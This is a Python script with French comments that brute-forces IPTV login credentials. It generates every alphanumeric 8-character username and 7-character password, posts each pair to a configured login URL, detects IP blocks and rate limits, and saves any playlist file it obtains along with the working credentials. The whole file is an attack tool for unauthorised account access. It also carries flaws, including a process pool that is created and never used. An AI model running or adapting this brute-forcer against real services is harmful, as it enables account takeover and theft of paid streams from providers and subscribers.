import requests
import itertools
import configparser
import time
from multiprocessing import Pool, cpu_count

# Initialisation du fichier de configuration
config = configparser.ConfigParser()
fichier_config = "config.ini"
config.read(fichier_config)

# Récupérer les paramètres
base_url = config.get("iptv", "base_url")
username = config.get("iptv", "username")
password = config.get("iptv", "password")
type_ = config.get("iptv", "type")
output = config.get("iptv", "output")

# Récupérer les headers depuis la configuration
headers = {
    "User-Agent": config.get("header", "User-Agent"),
    "Accept": config.get("header", "Accept"),
    "Connection": config.get("header", "Connection"),
    "Referer": config.get("header", "Referer")
}

# Générer des combinaisons pour username et mot de passe
def generate_combinations(characters, length):
    return ("".join(comb) for comb in itertools.product(characters, repeat=length))

# Vérifier si l'adresse IP est potentiellement bloquée
def is_ip_blocked(response):
    if response.status_code == 403:  # Code HTTP 403: Interdit
        print("❌ IP bloquée par le serveur. Arrêt du test.")
        return True
    if "Too Many Requests" in response.text:  # Message typique pour les limites
        print("⚠️ Trop de requêtes détectées. Arrêt du test.")
        return True
    return False

# Fonction pour tester une seule combinaison
def test_combination(combination, test_count):
    username, password = combination
    try:
        response = requests.post(base_url, headers=headers, data={"username": username, "password": password})

        if is_ip_blocked(response):
            print("🛑 Arrêt du test en raison d'un blocage.")
            return None

        if response.status_code == 200 and "Content-Type" in response.headers and "application/x-mpegURL" in response.headers["Content-Type"]:
            print(f"✅ Combinaison valide trouvée ! Username: {username}, Password: {password}")

            # Télécharger le fichier M3U
            with open(f"{output}_valid_{username}_{password}.m3u", "wb") as f:
                f.write(response.content)

            # Enregistrer la combinaison valide dans un fichier texte avec le nombre de tests effectués
            with open("valid_combinations.txt", "a") as valid_file:
                valid_file.write(f"Username: {username}, Password: {password} (Tests effectués: {test_count})\n")

            return (username, password, test_count)
    except requests.exceptions.RequestException as e:
        print(f"❗ Erreur lors de la requête : {e}")
    return None

# Fonction principale pour tester les combinaisons en parallèle
def brute_force_test():
    characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

    username_combinations = generate_combinations(characters, 8)
    password_combinations = generate_combinations(characters, 7)

    # Créer toutes les combinaisons possibles de username et mot de passe
    combinations = itertools.product(username_combinations, password_combinations)

    # Initialiser le compteur de tests
    test_count = 0

    # Utiliser tous les CPU disponibles
    with Pool(cpu_count()) as pool:
        results = []
        for combination in combinations:
            test_count += 1
            result = test_combination(combination, test_count)
            if result is not None:
                results.append(result)

    # Filtrer et afficher les résultats valides
    valid_combinations = [result for result in results if result]
    if valid_combinations:
        print("✨ Combinaisons valides trouvées :")
        for username, password, test_count in valid_combinations:
            print(f"🔑 Username: {username}, Password: {password} (Tests effectués: {test_count})")
    else:
        print("❌ Aucune combinaison valide trouvée.")

if __name__ == "__main__":
    brute_force_test()
